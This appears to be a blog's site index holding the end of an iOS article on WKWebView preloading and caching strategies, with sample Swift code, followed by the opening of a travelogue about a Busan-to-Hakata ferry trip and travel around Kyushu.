everything on the entire page. Instead, I only preload the resource files that the page will use, which may also be shared across pages; the page file .html is still fetched from the network and combined with the preloaded files to render the page.Please note: HTTP Cache is still used here, so these resources must support HTTP Cache; otherwise, future requests will still go through the network.Please note: HTTP Cache is still used here, so these resources must support HTTP Cache; otherwise, future requests will still go through the network.Please note: This still uses HTTP Cache, so these resources must support HTTP Cache; otherwise, future requests will still go through the network.&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-tw\"&gt; &lt;head&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/dist/main.js\" as=\"script\"&gt; &lt;link rel=\"preload\" href=\"https://image.zhgchg.li/v2/image/get/campaign.jpg\" as=\"image\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/glyphicons-halflings-regular.woff2\" as=\"font\"&gt; &lt;link rel=\"preload\" href=\"https://cdn.zhgchg.li/assets/fonts/Simple-Line-Icons.woff2?v=2.4.0\" as=\"font\"&gt; &lt;/head&gt;&lt;/html&gt;Common Supported File Types: .js script .css style font image The Web Team places the above HTML content in the agreed path with the App. Our WebViewPreloader then loads this path, and WKWebView will parse the &lt;link&gt; preload resources and generate the cache during loading.WebViewPreloader.shared.preload(\"https://zhgchg.li/campaign/summer/preload\")// or preload all at onceWebViewPreloader.shared.preload(\"https://zhgchg.li/assets/preload\") After testing, a good balance between data loss and preloading can be achieved . üéâ The downside is that this Cache resource list requires maintenance, and web page rendering and loading still need optimization; otherwise, the perceived load time of the first page will remain long.URLProtocol ‚ùåAlso, remember our old friend URLProtocol; all requests based on the URL Loading System (URLSession, openURL‚Ä¶) can be intercepted and manipulated.class CustomURLProtocol: URLProtocol { override class func canInit(with request: URLRequest) -&gt; Bool { // Determine if this request should be handled if let url = request.url { return url.scheme == \"custom\" } return false } override class func canonicalRequest(for request: URLRequest) -&gt; URLRequest { // Return the request return request } override func startLoading() { // Handle the request and load data // Change to cache strategy, read file locally first if let url = request.url { let response = URLResponse(url: url, mimeType: \"text/plain\", expectedContentLength: -1, textEncodingName: nil) self.client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed) let data = \"This is a custom response!\".data(using: .utf8)! self.client?.urlProtocol(self, didLoad: data) self.client?.urlProtocolDidFinishLoading(self) } } override func stopLoading() { // Stop loading data }}// AppDelegate.swift didFinishLaunchingWithOptions:URLProtocol.registerClass(CustomURLProtocol.self)The abstract idea is to secretly send URLRequest in the background -&gt; URLProtocol -&gt; download all resources by itself, user -&gt; WKWebView -&gt; Request -&gt; URLProtocol -&gt; respond with preloaded resources. As mentioned before, WKWebView runs on a separate thread outside the app‚Äôs main thread, so URLProtocol cannot intercept WKWebView requests. But I heard that using black magic might work, though it‚Äôs not recommended as it can cause other issues (submission rejected) No Entry ‚ùå.WKURLSchemeHandler üòïApple introduced a new method in iOS 11, seemingly to compensate for WKWebView‚Äôs inability to use URLProtocol; however, this method is more similar to AVPlayer‚Äôs ResourceLoader, where only schemes unrecognized by the system are passed to our custom WKURLSchemeHandler for handling.The abstract idea is to secretly send WKWebView -&gt; Request -&gt; WKURLSchemeHandler in the background to download all resources by itself, while the user -&gt; WKWebView -&gt; Request -&gt; WKURLSchemeHandler responds with the preloaded resources.import WebKitclass CustomSchemeHandler: NSObject, WKURLSchemeHandler { func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) { // Handle custom scheme let url = urlSchemeTask.request.url! if url.scheme == \"custom-scheme\" { // Change to cache strategy, read file locally first let response = URLResponse(url: url, mimeType: \"text/html\", expectedContentLength: -1, textEncodingName: nil) urlSchemeTask.didReceive(response) let html = \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello from custom scheme!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\" let data = html.data(using: .utf8)! urlSchemeTask.didReceive(data) urlSchemeTask.didFinish() } } func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) { // Stop }}let webViewConfiguration = WKWebViewConfiguration()webViewConfiguration.setURLSchemeHandler(CustomSchemeHandler(), forURLScheme: \"mycacher\")let customURL = URL(string: \"mycacher://zhgchg.li/campaign/summer\")!webView.load(URLRequest(url: customURL)) Because http/https are system-handled schemes, we cannot customize their handling; we need to change the scheme to one not recognized by the system (e.g., mycacher://). Use relative paths throughout the page to automatically apply mycacher:// for our Handler to capture. If you don‚Äôt want to change http/https but still want to capture http/https requests, you can only use black magic. Not recommended, as it may cause other issues (rejection during review). Cache page files locally and respond; Ajax, XMLHttpRequest, and Fetch requests used in the page may be blocked by the CORS Same-Origin Policy. You need to lower the website‚Äôs security to use this (because requests are sent from mycacher:// to http://zhgchg.li/xxx, which is a different origin). You may need to implement your own Cache Policy, such as when to update and how long it remains valid. (This is exactly what HTTP Cache does.) In summary, although theoretically feasible, the implementation requires huge investment; overall, it is not cost-effective and difficult to scale and maintain stability üòïIt seems that the WKURLSchemeHandler method is more suitable for handling large resource files within a webpage by declaring a custom scheme and letting the app handle it, working together to render the webpage.Bridge WKWebView Network Requests to Be Sent by the App ü´•WKWebView switches to calling predefined app interfaces (WkUserScript) instead of Ajax, XMLHttpRequest, or Fetch, letting the app request resources. This case is not very helpful because the first screen takes too long to appear, not the subsequent loading; moreover, this method creates an overly deep and strange dependency between Web and App ü´•Start with Service Worker ‚ùå Due to security concerns, only Apple‚Äôs own Safari App is supported; WKWebView is not supported‚ùå.WKWebView Performance Optimization ü´•Optimize and improve the performance of WKWebView Load View. WKWebView itself is like the skeleton, and the web page is the flesh. Research shows that optimizing the skeleton (e.g., reusing WKProcessPool) has very limited effect, possibly a difference of 0.0003 -&gt; 0.000015 seconds.Local HTML, Local Resource Files ü´•Similar to the Preload method, but instead, the event page is placed in the App Bundle or fetched remotely at startup. Hosting the entire HTML page may also encounter CORS same-origin issues; simply hosting web resource files seems suitable for using the ‚Äúcomplete HTTP Cache + WKWebView Preload pure resources‚Äù method instead; including them in the App Bundle only increases App Size, fetching from remote is WKWebView Preload ü´•Frontend Optimization Starts üéâüéâüéâSource: wedevsRefer to wedevs optimization suggestions, the front-end HTML page typically has four loading stages: from initially loading the page file (.html) First Paint (blank page) to First Contentful Paint (rendering the page skeleton), then to First Meaningful Paint (adding page content), and finally to Time To Interactive (when the user can interact).Test with our page; browsers and WKWebView first request the main .html page, then load the required resources. Meanwhile, they build the interface for the user according to the program instructions. Comparing with the article, the page phase actually only has First Paint (blank) to Time To Interactive (First Contentful Paint only shows the Navigation Bar, which probably doesn‚Äôt count‚Ä¶), missing intermediate staged rendering for the user. Therefore, the overall user waiting time is extended. Currently, only resource files have HTTP Cache set; the main page does not.You can also refer to Google PageSpeed Insights for optimization suggestions, such as compression, reducing script size, and more. Because the core of in-app WKWebView is still the web page itself, adjusting from the front-end web is an effective and efficient approach. üéâüéâüéâUser Experience Focus üéâüéâüéâ A simple implementation starting from user experience: add a Loading Progress Bar. Don‚Äôt just show a blank page that leaves users confused. Let them know the page is loading and how far along it is. üéâüéâüéâConclusionThe above summarizes some ideas and research on feasible approaches for WKWebView preloading and caching. The technical aspect is not the biggest issue; the key is choosing the methods that are most effective for users while minimizing development costs. Selecting the right approach may only require minor adjustments to achieve the goal directly. Choosing the wrong method can lead to wasted resources, going in circles, and likely difficulties in maintenance and usage later on. There are always more solutions than difficulties; sometimes, it‚Äôs just a lack of imagination.There might be other genius combinations I haven‚Äôt thought of. Feel free to contribute your suggestions.ReferencesWKWebView Preload Pure Resource üéâ You can refer to the following video for the solution&lt;iframe class=‚Äùembed-video‚Äù loading=‚Äùlazy‚Äù src=‚Äùhttps://www.youtube.com/embed/ZQvyfFieBfs‚Äù title=‚Äù‚ÄúPreload strategies using WKWebView‚Äù by Jonat√°n Urquiza‚Äù frameborder=‚Äù0‚Äù allow=‚Äùaccelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture‚Äù allowfullscreen&gt;&lt;/iframe&gt;The author also mentioned the methods of WKURLSchemeHandler.The complete demo repo in the video is as follows:iOS Veteran Weekly ReportThe veteran driver‚Äôs weekly report on WkWebView is also worth a read.ChatA long-awaited return to writing in-depth articles about iOS development.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours", "url": "/posts/travel-journals/kyushu-9-day-independent-trip-busan-to-hakata-cruise-entry-and-scenic-tours-cb65fd5ab770/", "categories": "Travel Journals", "tags": "english, ai-translation, lifestyle, japan, travel, fukuoka, travel-writing", "date": "2024-06-21 01:17:26 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 Second Visit to Kyushu: 9-Day Independent Trip via Busan ‚Üí H...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 Second Visit to Kyushu: 9-Day Independent Trip via Busan ‚Üí Hakata Cruise Entry11-Day Trip from Busan, South Korea to Japan via the New Camellia Cruise, Visiting Yufuin, Oita, Fukuoka, Shimonoseki, Itoshima, and SaseboBackgroundTaking advantage of the short break between finishing a phase of work and starting a new job, I went to Japan for some relaxation; resigned on 5/30, departed on 6/3, returned on 6/13, and started the new job on 6/24. The timing was perfect, as the break allowed for a longer trip (total of 11 days). This was a pseudo solo trip, teaming up with James Lin, who went to Tokyo with me last year (Ex-Binance Android Developer, feel free to refer job opportunities to him) ; this is my second visit to Kyushu. Last September was my first time in Kyushu, visiting must-see spots in Fukuoka, Kumamoto, and Nagasaki. This time, I mainly covered places I missed before, so the itinerary differed from James‚Äôs, and we acted separately.The following are the places I visited last time and may not visit again this time. For those interested in learning more about Kyushu, please refer to my previous travelogue ‚Äú2023 Kyushu 10-Day Solo Trip‚Äù: Fukuoka: Mojiko, Kokura Castle, Kushida Shrine, Sumiyoshi Shrine, Nakasu Yatai, Fukuoka Tower, PayPay Dome, Tenjin Shopping, Hakata Canal City, Lalaport, Yanagawa Boat Tour, Dazaifu Nagasaki: Chinatown, Glover Garden, Mount Inasa Night View, Atomic Bomb Museum, Peace Park Kumamoto: Kumamoto Castle, Aso Nakadake, Aso Shrine, Suizenji Jojuen Garden, Tsurumai Department Store, Kamitori Shopping Street, Shimotori Shopping Street, Kato Shrine, Sakuramachi Department Store, Kumamon Square (Director‚Äôs Office) Above, please refer to 2023 Kyushu 10-Day Solo Travel .What I Learned This LineSummarize what you learned from this trip at the beginning: ‚ÄúIndependent travel means constantly paying tuition (spending time or money) to learn. The more experience you have, the fewer pitfalls you will encounter.‚Äù At JR stations without electronic signboards, check the timetable on the platform bulletin board to confirm the train‚Äôs stopping platform. ‚ö†Ô∏è At small JR stations without a stationmaster, you must get off at the first car (the conductor also acts as the stationmaster, similar to getting off a bus). JR limited express tickets are separate from regular tickets. After buying a regular ticket, you must also purchase a limited express ticket to ride the limited express; boarding without it will require paying a fare difference. (With a JR Pass, you can board freely without worry.) JR Limited Express trains almost always have ticket inspections. If you take an unreserved seat, the conductor will often ask your destination for record-keeping. If you book the JR Pass online in advance (payment of reservation fee by credit card required), you must present the same credit card for verification when exchanging the JR Pass. So be sure to bring that card to Japan. ‚ö†Ô∏è If you book the Camellia Express too late, only economy dorms are available (8‚Äì11 people, mixed gender, Japanese-style public bath only, lights out at 11 PM). Yufuin no Mori was fully booked due to late reservation, so I had to take the regular Yufu JR train. Boat rides at Takachiho Gorge require advance booking. Two Shinkansen trains are not covered by the JR Pass: ‚ÄúNozomi‚Äù and ‚ÄúMizuho‚Äù; tickets must be purchased separately. The JR Pass sometimes gets stuck at the Shinkansen ticket gate when entering or exiting Hakata Station, requiring manual assistance (since the two trains mentioned above cannot be used, as long as you confirm you are not taking these trains, staff will let you through). Always double-check your bookings. This time, when booking the new Camellia train, the gender was entered incorrectly, so I quickly contacted customer service for correction on the same day. ‚ö†Ô∏è(Later found out that mixed-gender accommodation was probably fine, but it was still quite a shock.) Kyushu buses are not always on time, and Google Maps directions are not always accurate. Japan Luggage Storage Coin Lockers Search and Reservation (But not all locations are listed; many places that accept luggage are not shown) Korea power adapter needed. Korean won can only be exchanged at the counter. Korea allows you to buy only the Tmoney transportation card without needing the Wowpass. KKday Promotion Japan JR PASSÔΩúKyushu Area Rail PassÔΩúNorth Kyushu &amp; South Kyushu &amp; All KyushuÔΩúE-ticket Japan Nagasaki | Kyushu Huis Ten Bosch Ticket Huis Ten Bosch Japan Fukuoka | Hakata Port - Busan Port Passenger and Cargo Ferry ‚ÄúNew Camellia‚Äù Camellia Line Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Fukuoka NishitetsuÔΩúDazaifu Tenmangu + Yanagawa Boat Tour Sightseeing PassÔΩúPick up at Fukuoka Airport International Terminal Japan Fukuoka teamLab Forest Fukuoka Ticket ‚Äî SBI SecuritiesÔΩúCheck Now „ÄêSolo Tour„ÄëKyushu One-Day Trip in JapanÔΩúTakachiho Gorge &amp; Amano Iwato Shrine &amp; Amano Yasugawara (Includes Special Aso Akaushi Beef BBQ Set)ÔΩúDeparting from Fukuoka One-Day Trip in Kumamoto, KyushuÔΩúAso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen / All-You-Can-Eat Seasonal FruitsÔΩúDeparting from Fukuoka Hakata (Chinese, English, Japanese Supported) Preparation WorkJoyThis trip mainly explores the New Camellia Ferry from Busan, South Korea to Fukuoka (Hakata), Japan, as well as Yufuin, Oita Beppu, and Takachiho in Miyazaki Prefecture.The pre-trip plan is as follows: (Planned only one day before departure, actual order may not follow the plan, did not go to South Aso because it was too far) 6/3 Around 19:00 Arrive at Busan-Gimhae Airport, 20:00 Arrive at Busan Station, hotel check-in, find food nearby 6/4 Haedong Yonggungsa Temple, Haeundae Beach, depart Korea at night, take the New Camellia Ferry 6/5 Arrive in Fukuoka, go to Karatsu, head up to Nanatsugama, head down to Yutoku Inari Shrine, Oya Shrine with its underwater torii gate, return via LalaportActual: Only visited Yutoku Inari Shrine 6/6 Morning: Take JR to Yufuin, afternoon: head to Oita 6/7 Oita and Beppu Hell Tour 6/8 Moji, Shimonoseki, Karato MarketActual: Visited Karatsu Castle more 6/9 Minami Aso, Shirakawa Spring, Kamiiroki Kumanoza ShrineActual: Changed to Sasebo (Kujukushima Sightseeing Boat), Takeo Onsen 6/10 Review the missed itinerary from 6/7: Oya Shrine Sea Torii, Yutoku Inari Shrine, Lalaport or shoppingActual: Visited Sakurai Futamigaura Meoto Iwa, Nanzoin Temple, Hakata pilgrimage 6/11 KKDAY Takachiho One-Day Tour, Takachiho Shrine, Takachiho Gorge, Amanoiwato Shrine, Amano Yasugawara 6/12 Sasebo, Kujukushima, Huis Ten Bosch, or BaseballActual: Shopping in Hakata, shopping in Tenjin, watching baseball at PayPay Dome 6/13 Shopping in Fukuoka city, evening flight at 21:00 back to TaiwanActual: Visited Lalaport more This time I bought DJB online again, with 2GB for 2 days in Korea and unlimited data for 9 days in Japan, totaling NT$1,250.Takachiho is very difficult to reach from Fukuoka, so I directly booked the KKDAY Takachiho One-Day Tour, which includes private car, lunch, and a Chinese-speaking guide, at a price of NT$2,272 per person.Row‚úàÔ∏è Flights Departure: China Airlines Taipei Taoyuan TPE 15:55 -&gt; Busan Gimhae International Airport PUS 18:55 Return: China Airlines Japan Fukuoka Airport FUK 21:00 -&gt; Taipei Taoyuan TPE 22:25 Round trip including checked baggage (23 kg per piece) Price: NT$10,480üõ≥Ô∏èCruise New Camellia Departure: 18:30 Check-in at Busan Port International Ferry Terminal Arrival: 07:30 Hakata Port International Terminal Price: Economy/Second Class Compartment: Shared Cabin NT$1,450 per personüöÖ JR Pass Kitakyushu Rail Pass (5 Days)Price: NT$3,042 During this trip in Kyushu, I took the limited express trains whenever possible with the JR Pass. Except for Yufuin, which required a reserved seat, I used the non-reserved cars for all other trains (not crowded, seats were available).From ‚ÄúBuin no Mori,‚Äù I couldn‚Äôt book from Hakata to Yufuin, so I could only reserve a seat on ‚ÄúYufu 1.‚ÄùPlease note that Yufuin no Mori is different from the Regular Train (Yufu X). When booking, make sure you are reserving Yufuin no Mori.Booking Method: You must buy the JR Pass first before booking, as the travel agency option for reservation is only KLOOK. Other agencies may not be able to make reservations. (The page states that customers with MCO issued by agencies other than those mentioned should not make any selections. It should still be fine.) Therefore, I bought the JR Pass from KLOOK.1. Go to the JR Pass reservation homepage:Scroll down to find ‚ÄúRail Pass Purchase‚Äù -&gt; ‚ÄúInquiry/Change/Refund‚Äù2. Access the JR Pass Reservation Page :Select ‚ÄúRegister‚ÄùRead and agree to the terms, then click ‚ÄúProceed to the next page‚ÄùEnter the email you want to register and click ‚ÄúSign Up‚Äù.Check your inbox, note the ‚Äútemporary password,‚Äù and click the continue link. Travel Agency Name Selection: KLOOK For guests with MCOs not issued by the above travel agencies, please do not make any selections. KRP Reservation Number / MCO NumberGo to KLOOK to check the JR Pass voucher and copy-paste the following voucher number. NameEnter the name on the JR Pass order. According to the instructions, if the voucher is issued by KLOOK, you need to enter the given name followed by the surname. For example, if the voucher shows LI ZXXX CXXX, you should enter ZXXX CXXX LI here. Please enter the name registered when purchasing the JR Kyushu Rail Pass Online Booking, or the name shown on the exchange voucher (eMCO, MCO) issued by the travel agency. For customers using vouchers issued by KLOOK, please enter your ‚ÄúFirst Name‚Äù and ‚ÄúLast Name‚Äù in that order. Enter the temporary password from the email5.6. Enter the password you want to set for loginAfter setting the password, you can check and book reserved train seats on the homepage during the available booking hours (Japan Time 05:30~23:00). Booking is not available outside these hours. Departure Date Departure Station: Hakata Arrival Station: Yufuin Yufuin no Mori is fully booked, so you can only reserve the regular train Yufu 1, which departs at 07:43 and arrives at 10:03. Continue to the next page to select seat preference, location, and carriage.Enter the start date for using the travel pass.Enter credit card information to pay the reservation fee (1,000 yen per adult / 500 yen per child). The above is the purchaser‚Äôs credit card. When collecting the tickets at the counter, you must bring and present the credit card used for payment. The above is the buyer‚Äôs credit card. When picking up the ticket at the counter, you must bring and show the credit card used for the purchase. The above is the purchaser‚Äôs credit card. When collecting tickets at the counter, you must bring and present the credit card used for payment. ‚ö†Ô∏è Please be sure to bring the credit card used when collecting the tickets ‚ö†Ô∏èCheckout, reservation complete!Accommodation (10 nights, including 1 night on a cruise) [6/3] Toyoko INN Busan Station No.1 (1 night)The location is excellent, right outside Busan Station. Walking further leads to Busan Port International Shipping Terminal, making travel convenient.Price: NT$1,940 for a twin room for two people [6/4] New Camellia Ferry (1 night)Price: NT$1,450 per person [6/5] Toyoko INN Hakata-guchi Ekimae (1 night)About a 10-minute walk from Hakata Station.Price: NT$2,911 for a twin room for two people [6/6, 6/7] Toyoko INN Oita Station Front (2 nights)About a 10-minute walk from Oita Station.Price: NT$4,389 for a twin room for two people [6/8, 6/9] APA Hotel Fukuoka-Watanabedori EXCELLENT (Fukuoka Watanabedori Station Front) (2 nights)About a 5-minute walk from Watanabe-dori Station.Price: NT$9,311 for a twin room for two people [6/10, 6/11, 6/12] Toyoko INN Fukuoka Tenjin (3 nights)About a 10-minute walk from Tenjin-Minami Station.Price: NT$7,131 for a twin room for two people Total: $14,291, averaging $1,400 per night. This time, I finally kept it under $1,500 per night. Thanks to Toyoko INN! Additionally, Toyoko INN membership offers 3 PM check-in, 1 free night after 10 stays, booking 6 months in advance, 5% discount, direct card check-in, and more benefits. Last time I stayed at Toyoko INN in Hiroshima, I signed up for their membership. Just tell the front desk you want to join when checking in, fill out a simple form, pay the one-time membership fee of 1,500 yen, have your photo taken on the spot, and get your card immediately. You can use it from then on.In South Korea, use Naver Map to plan your trips and routes in advance for easy reference: I think it‚Äôs more useful than Google Maps for travel maps! Can log in directly using Line Go! Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application‚Ä¶ These were mentioned in previous articles, so they won‚Äôt be repeated here.Visit Japan has now combined into one: the same QR code is used for both immigration and customs.Day 1 DepartureAs with previous trips abroad, I went to the Airport MRT Taipei Station A1 to check in early, so I could go straight to immigration at the airport. ( For flights eligible for early check-in and regulations, please refer to the official website ). I originally planned to take the Orange Line to Sanchong to transfer to the Airport MRT, but the other check-in station for the Airport MRT is at A3 New Taipei Industrial Park Station, not Sanchong Station. Also, there is no direct train from Sanchong Station, so I still went to Taipei Main Station to transfer. Like before, I placed an AirTag in my suitcase for easy tracking when traveling abroad.Taoyuan Airport TPE Terminal 1This time, China Airlines flies to Busan from Terminal 1.At the airport, first find the counter to exchange Korean won. Foreign currency ATMs rarely offer Korean won and usually only provide Japanese yen; the airport exchange rate is poor and charges a NT$100 handling fee. Therefore, if you have time, it is recommended to exchange currency at the bank counter in advance.13:00 Departure ImmigrationAround 1:00 PM, I finished the exit procedures.Bought a Ding Gua Gua fried chicken at Terminal 1 departure for lunch.Previously, the scenic rest area was always closed when I passed by. This time it was open, so I went up to take a look. Unexpectedly, it was very small.Since it was still early, I decided to rest in the EVA Air‚Äôs free lounge area. There weren‚Äôt many people at this time.Ding Gua Gua fried chicken is marinated and very tasty. Unfortunately, this airport branch does not offer Gua Gua buns; also, I noticed that all the charging stations here have been removed, leaving only the shells, so charging is not possible.The bathrooms, which include toilets, are few in number (about five by estimation), very clean and upscale, with cleaning staff attending promptly.15:20 Boarding beginsBoarding begins around 15:20.Terminal BR requires a shuttle bus transfer to the boarding gate. There are very few people on the flight to Busan! As shown in the picture, there appear to be fewer than 30 people.This China Airlines flight to Busan uses a 737‚Äì800 medium-sized aircraft with no entertainment screen. Bye Taiwan!You can only access entertainment content via the onboard Wi-Fi, and there are quite a few movies! ‚ÄúRush‚Äù is available! The in-flight meal was three-cup chicken noodles (pretty bad), but surprisingly, there was a collaboration from China Airlines x Wutonghao x Dinotaeng Quokka, and I received a short-tailed possum snack.Fill out the immigration card and customs declaration form. You can apply for the quarantine QR Code in advance. If not applied, you need to fill out an additional quarantine card.19:05 Arrive at Busan Gimhae International Airport PUS, South KoreaThe daytime temperature in Korea is around 20‚Äì25¬∞C, while at night it may drop below 20¬∞C; it‚Äôs somewhat similar to autumn in Taiwan.19:20 Exit the airport KKday Korea Busan Pass VISIT BUSAN PASSAround 19:20, enter the country and collect luggage before leaving the airport.At that time, I misunderstood the relationship between wowpass and tmoney, thinking they were just two cards combined into one; my understanding was that wowpass is a cash card that includes top-up, currency exchange, withdrawal, and shopping, while tmoney is a transportation card, and wowpass would include tmoney; in reality, you only need to buy tmoney, not wowpass. I didn‚Äôt realize this and kept looking for wowpass instead of tmoney. There are no wowpass machines at Busan International Airport, so I relied on cash to buy tickets and took the bus all the way to Busan.From Gimhae Airport to Busan Station, you need to transfer three times on the subway; there are not many passengers getting off, so it‚Äôs not crowded. If you have a transportation card, you can tap it directly to enter. First Ticket Purple Line Busan Gimhae Light Rail from Airport Station to Sasang Station Follow the floor markings to the platform After getting off at Sha Shang Station on the Purple Line, follow the signs to transfer to the Green Line. Take the Green Line 2 to Ximen Station. Buy a second ticket to Seomyeon Station. Take the Green Line to Ximending Station, then get off and walk straight to the Orange Line platform. Take Orange Line 1 to Busan Station and get off. Transferring from the Green Line to the Orange Line does not require leaving the platform. I‚Äôm not sure if it was possible to buy a ticket to Busan Station on the Green Line at that time, as I didn‚Äôt check carefully. Therefore, I couldn‚Äôt exit at Busan Station without manual ticket adjustment.20:20 Arrive at Busan StationThe outbound station is Toyoko INN Busan Station No. 1.Put your luggage away and go out to find food. Fortunately, the hotel has 100V Taiwanese power outlets/USB sockets, so no adapter is needed.Because it was late, nearby barbecue places were closed; I randomly chose a pork soup rice restaurant to eat at ( The Doi Jongga Dwaejigukbap Busan Stn. ). Pork soup rice has a strong pork flavor. The broth is oily but not heavy, and pairs well with rice. Grilled pork neck on a pan, wrapped in lettuce and kimchi, tastes good but can be greasy if eaten too much. Two servings of soup rice + one plate of pork neck meat, total 46,000 KRW. Wowpass / TmoneyThe hotel lobby has a wowpass machine. Scan your passport and follow the instructions to complete the process, and the machine will print out a wowpass+tmoney combo card. The upper part is Wowpass The chip is Wowpass Wowpass top-up and Tmoney are separate. Wowpass allows top-up via Wowpass machines, direct top-up in TWD, online credit card top-up, currency exchange, and withdrawal (fees apply). Wowpass has an expiration date , unused for too long may cause the balance to disappear The chip can be used for card payments at merchants. Tmoney can be recharged at convenience stores or subway recharge machines. Temporarily unable to deposit Tmoney via Wowpass (officially stated to be available in the future) Wowpass card issuance requires a deposit of 5,000 KRW, but it seems this step can be skipped. Does skipping mean free card issuance? The lower part is Tmoney. Remember to use the lower part when taking the subway or bus; my first time using the whole card failed repeatedly, as it seemed to detect Wowpass. After receiving the physical card, you can link it in the Wowpass App. The Wowpass App can check the Wowpass balance. Tmoney balance can only be checked by tapping the card (so unique!). As shown in the image above, the Wowpass balance is 454 KRW / the Tmoney balance is 2,500 KRW. If you want to check tmoney top-up and deduction details, you need to install the App (BucaCheck): Still relies on card sensing to read content If this travelogue is helpful to you, you can enter my invitation code 373TBH87 when registering on Wowpass.After dinner, we went to GS 25 to buy Korean beer and some Korean snacks. Kelly is tasty, the one on the right is like spicy strips but less salty and spicy, perfect as a drinking snack. The crab-flavored crackers are just okay.Rest, end of the hectic Day 1.Day 2 Haedong Yonggungsa Temple, Haeundae, and Riding the New Camellia CruiseHaedong Yonggungsa TempleEarly in the morning, take the 1001 bus from Busan Station bus stop to Haedong Yonggungsa Temple; frequent service and not crowded.The trip is a bit long, about an hour and a half. Korean buses are similar to those in Taiwan, and the drivers tend to drive quite fast. Normally, passengers board from the front and exit from the rear, but some buses have the opposite arrangement.The drop-off point is right across from Skyline Luge Busan.After getting off, walk straight ahead and you will see the sign for Haedong Yonggungsa Temple. Turn right and walk up a hillside path to reach it; the map says it takes 15 minutes, but since it‚Äôs uphill, it usually takes about 30 minutes. If you don‚Äôt want to walk, you can also take a taxi.You will first pass through a shopping street, and nearby there is a container market area where you can rest and grab some food. Inside, you can see a row representing the 12 zodiac signs, including the Dog (Year of the Dog).If you walk a bit further, you will see the archway of Haidong Longgong Temple, which is very colorful and distinctive.It‚Äôs a downhill walk to the main hall of Haidong Longgong Temple, so be careful on the long flight of stairs.You can first go to the viewing platform on the left to overlook the entire temple.Entering the main hall, you can buy a tile outside to write your wish on (10,000 KRW).HaeundaeTake bus 1001 again from the Haedong Yonggungsa Temple bus stop back to Haeundae (about 1 hour).The sun was shining brightly that day, and there was a sand sculpture exhibition on the beach. Be careful going down the stairs. I saw a Korean man miss a step and fall into a pile of sand (fortunately, it was just sand).HiHaeundae LCT, a landmark building in Busan.HAEUNDAE Haeundae, clear blue sky.Haeundae Beach has lifeguards and marked red-line zones, and water activities can also be arranged.For lunch, we ate Korean BBQ near Haeundae at Baegnyeon Sikdang. The staff grilled the meat for us. We ordered Korean beef sirloin and pork neck, both very delicious. We also had a stone pot rice with a strong crispy rice crust aroma. The meal was shared between two people.Also ordered Korean beer and soju to drink heartily. (Forgot to try soju beer) Price 13.0 means 13 * 1000 = 13,000 KRW There are also many Korean side dishes, all pickled items, kimchi, and marinated raw crab (supposedly eaten raw but very fishy, so I didn‚Äôt try it). The staff are nice, and their English is fairly good. Next to it is the Haeundae Traditional Market, mainly selling local seafood. After buying an ice cream and taking a walk around, I went to another shop that sells ice cream croissants and had a certain tea ice cream croissant (crispy outside, soft inside, delicious!).After eating, I forgot that Haeundae also has a monorail and the Haeundae LCT, which is worth visiting (I didn‚Äôt research the Busan itinerary carefully when planning). It was around 14:00, so I took the 1001 bus back to Busan Station, planning to decide where to go next or explore around Busan Station.Back at Busan Station around 15:00, there was still plenty of time before the cruise check-in at 18:30. Upon returning, I realized there was nowhere to explore at Busan Station (it seems there are no department stores, shopping streets, or attractions). I was hesitant to go to Gamcheon Culture Village because it seemed too far, but I found that a few stops down from Busan Station, you can visit Busan Tower and nearby department stores and shopping streets. Originally planned to go to Busan Tower but got off at the wrong subway station, walked a long way, gave up, and returned. KKday Busan, South Korea | Yongdusan Park Busan Tower Observatory Electronic Ticket . To visit Busan Tower, get off at Nampo Station and take exit 1 or 3 to Gwangbok-ro Fashion Street. Then use the escalator to Yongdusan Park. Avoid taking the longer hill route.Bought the famous Korean banana milk to drink.17:00 Head to Busan Port International Ferry TerminalAround 5 PM, after wandering near Busan Station, I went to the hotel to pick up my luggage and headed to Busan Port International Passenger Terminal.Enter the Busan Station lobby (2nd floor), find Exit 10, and walk along the skybridge to reach Busan Port International Ferry Terminal (about a 15-minute walk). Never take the ground-level road; there are many large vehicles, and it is very dangerous.Busan Port Bridge during the day.Busan Port International Passenger Terminal (pier) is quite empty inside, with few people, as daily flights are also limited; besides trips to Fukuoka Hakata, there are cruises to Shimonoseki, Tsushima Island, Osaka, Kumamoto, and more.From the lobby, go up to the 3rd floor departure area and first go to New Camellia to exchange your ferry ticket. (Passport required)Around 17:30, boarding began. The waiting area for departure is very spacious; you can actually walk around and buy food to bring on the boat.Things to Note: Hakata Port does NOT support electronic customs clearance, so please be sure to fill out the arrival card and customs declaration form ‚ö†Ô∏è You can bring food and water without putting them in your suitcase since there is no need to check in luggage; the suitcase stays with you on the ship. Holding a drink alone is not allowed The entire departure process was very quick, and the security check was just a formality (everything went through the X-ray). 18:30 Departure gates 